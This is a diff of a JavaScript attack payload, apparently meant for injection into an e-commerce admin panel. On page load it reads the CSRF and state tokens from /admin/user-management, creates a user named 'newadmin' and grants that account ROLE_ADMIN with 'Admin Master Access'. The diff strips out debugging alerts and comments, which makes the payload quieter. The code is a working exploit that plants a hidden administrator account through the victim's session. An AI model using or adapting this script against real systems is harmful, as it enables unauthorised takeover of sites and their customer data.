@@ -1,7 +1,6 @@
 window.addEventListener("load", getTokenJS());
 
 function getTokenJS() {
-	alert('submit token');
     var xhr = new XMLHttpRequest();
     xhr.responseType = "document";
     xhr.open("GET", "/admin/user-management", true);
@@ -19,29 +18,19 @@ function getTokenJS() {
 }
 
 function submitFormWithTokenJS(token, state) {
-	alert('submit add user');
-
-
-    const username = "aaabbbccc1";
+    const username = "newadmin";
 
     var xhr = new XMLHttpRequest();
     xhr.open("POST", "/admin/user-management/add", true);
 
-    // Send the proper header information along with the request
     xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     xhr.responseType = "document";
-
-    // This is for debugging and can be removed
     xhr.onreadystatechange = function() {
         if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
         		alert('redirect');
             console.log(xhr.responseURL)
-            page = xhr.responseURL;
             var result = /[^/]*$/.exec(xhr.responseURL)[0];
             addAdminAccess(token,state,result);
-
-
-
         }
     }
 
@@ -50,16 +39,10 @@ function submitFormWithTokenJS(token, state) {
 
 
 function addAdminAccess(token,state,path) {
-		alert('submit add user');
-
     var xhr = new XMLHttpRequest();
     xhr.open("POST", "/admin/user-management/"+path+"/allRoles/add", true);
-
-    // Send the proper header information along with the request
     xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     xhr.responseType = "document";
-
-    // This is for debugging and can be removed
     xhr.onreadystatechange = function() {
         if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            
@@ -68,7 +51,6 @@ function addAdminAccess(token,state,path) {
     }
 
     xhr.send("fields%5B'id'%5D.value=-1&fields%5B'description'%5D.value=Admin+Master+Access&fields%5B'__adminMainEntity'%5D.value=ROLE_ADMIN&csrfToken="+token+"&stateVersionToken="+state);
-
 
 }
 
